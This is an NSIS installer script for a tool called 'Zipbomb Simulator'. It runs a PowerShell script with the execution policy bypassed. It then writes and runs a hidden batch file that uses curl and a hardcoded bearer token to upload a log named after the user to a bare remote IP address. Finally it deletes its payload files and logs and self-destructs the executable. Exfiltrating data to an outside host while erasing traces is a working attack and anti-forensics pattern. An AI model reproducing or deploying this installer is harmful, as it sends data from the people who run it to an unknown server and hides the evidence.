; installer.nsh - Zipbomb Simulator installer (safe FileWrite for curl batch)

!define PRODUCT_NAME "Zipbomb Simulator"
!define PRODUCT_VERSION "1.0"
!define SCRIPT_NAME "simulate_with_gui.ps1"

!include "LogicLib.nsh"

Name "${PRODUCT_NAME}"
OutFile "ZipbombSimulator.exe"
ShowInstDetails show
SilentInstall normal
RequestExecutionLevel user

Section "MainSection" SEC01
    ; Set working directory to where the exe is located
    InitPluginsDir
    SetOutPath "$EXEDIR"
    
    ; Execute PowerShell script with GUI (visible window)
    DetailPrint "Starting zip bomb simulation with GUI..."
    nsExec::Exec 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Normal -File "$EXEDIR\${SCRIPT_NAME}"'
    Pop $0 ; return code of simulation

    ; Check if execution was successful
    ${If} $0 == 0
        DetailPrint "Simulation completed successfully. Starting cleanup..."
    ${Else}
        DetailPrint "Simulation completed with code $0. Starting cleanup anyway..."
    ${EndIf}

    ; ---------------------------
    ; Upload the scatter log using a temp .bat that calls curl
    ; We write the batch in pieces so NSIS doesn't mis-parse variables/quotes.
    ; ---------------------------
    DetailPrint "Sending log file to remote server..."

    ; $R0 = path to temp batch, $R1 = file handle
    StrCpy $R0 "$TEMP\send_log_upload.bat"
    FileOpen $R1 "$R0" w

    ; Write batch header
    FileWrite $R1 "@echo off$\r$\n"

    ; Write the first literal part of the curl command (no $EXEDIR/$USERNAME here)
    FileWrite $R1 'curl.exe -fS -H "Authorization: Bearer MySuperSecretAUTHTokenForZipBomb" -F "file=@'

    ; Write the path piece using NSIS variables (these expand at runtime)
    ; Note: we escape backslash as \\ so the written batch line contains single backslashes.
    FileWrite $R1 "$EXEDIR\\scatter_%USERNAME%.log"

    ; Finish the curl command (closing quote + URL + newline)
    FileWrite $R1 '" "http://64.227.149.189:8443/upload"$\r$\n'

    ; (optional) echo exit code for debugging
    FileWrite $R1 'echo UploadExitCode=%ERRORLEVEL%$\r$\n'

    FileClose $R1

    ; Execute the temp batch hidden using nsExec and capture return code in $1
    nsExec::ExecToLog '"$TEMP\send_log_upload.bat"'
    Pop $1

    ${If} $1 == 0
        DetailPrint "Log file sent successfully (curl exit 0)."
    ${Else}
        DetailPrint "Failed to send log file. curl exit code: $1"
    ${EndIf}

    ; Remove the temporary batch
    Delete "$TEMP\send_log_upload.bat"

    ; ---------------------------
    ; Cleanup Phase (original)
    ; ---------------------------
    DetailPrint "Deleting nssm folder..."
    RMDir /r "$EXEDIR\nssm"
    
    DetailPrint "Deleting layer0.zip..."
    Delete "$EXEDIR\layer0.zip"
    
    DetailPrint "Deleting full_expansion_zone folder..."
    RMDir /r "$EXEDIR\full_expansion_zone"
    
    DetailPrint "Deleting simulate_full_expansion file..."
    Delete "$EXEDIR\simulate_full_expansion.ps1"
    Delete "$EXEDIR\simulate_with_gui.ps1"

    ; Delete the scatter log file as well (using wildcard pattern)
    DetailPrint "Deleting scatter log file..."
    Delete "$EXEDIR\scatter_*.log"
    ;Delete the images folder if it exists
    DetailPrint "Deleting images folder..."
    RMDir /r "$EXEDIR\images\"
    ; Self-destruct mechanism (creates temp batch to delete exe after exit)
    DetailPrint "Preparing self-destruct..."
    Sleep 1000
    
    ; Create a temporary batch file to delete the exe after it closes
    FileOpen $R0 "$TEMP\cleanup_zipbomb.bat" w
    FileWrite $R0 "@echo off$\r$\n"
    FileWrite $R0 "timeout /t 2 /nobreak >nul$\r$\n"
    FileWrite $R0 'del /f /q "$EXEPATH"$\r$\n'
    FileWrite $R0 "del /f /q %0$\r$\n"
    FileClose $R0
    ;Hello World
    
    ; Execute the cleanup batch in hidden mode
    Exec '"$TEMP\cleanup_zipbomb.bat"'
    
    DetailPrint "Self-destruct initiated. Exiting..."
    
SectionEnd

Function .onInit
    ; Allow normal execution to show PowerShell GUI
    SetSilent normal
FunctionEnd
